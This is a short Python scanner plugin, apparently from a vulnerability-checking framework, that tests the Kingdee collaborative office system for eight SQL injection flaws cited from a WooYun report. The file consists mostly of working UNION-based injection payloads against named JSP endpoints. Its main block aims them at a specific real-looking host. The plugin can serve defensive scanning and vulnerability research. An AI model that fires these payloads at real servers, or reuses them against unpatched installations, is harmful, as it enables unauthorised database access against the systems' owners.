#!/usr/bin/evn  python 
#-*-:coding:utf-8:-*-  
#refer:#http://www.wooyun.org/bugs/wooyun-2015-0136918
import re,urlparse

def assign(service, arg):
    if service == "kingdee_oa":
        return True, arg

def audit(arg):
    #金蝶协作办公系统存在八个高危SQL注射
    payloads=["kingdee/tree/tree/announce/get_nodes.jsp?node=1%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
              "kingdee/tree/tree/announce/get_selected.jsp?ids=1)%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
              "kingdee/tree/tree/discuss/get_nodes.jsp?node=1%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
              "kingdee/tree/tree/discuss/get_selected.jsp?ids=1)%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
              "kingdee/tree/tree/news/get_nodes.jsp?node=1%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))----",
              "kingdee/tree/tree/news/get_selected.jsp?ids=1)%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
              "kingdee/tree/tree/rules/get_nodes.jsp?node=1%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
              "kingdee/tree/tree/rules/get_selected.jsp?ids=1)%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--"]
    for payload in payloads:
        url=arg+payload
        code ,head,res,body,_ = curl.curl(url)
        if code == 200 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
            security_hole(url)      

if  __name__ == '__main__': 
    from dummy import *
    audit(assign('kingdee_oa','http://oa.roen.cn/')[1])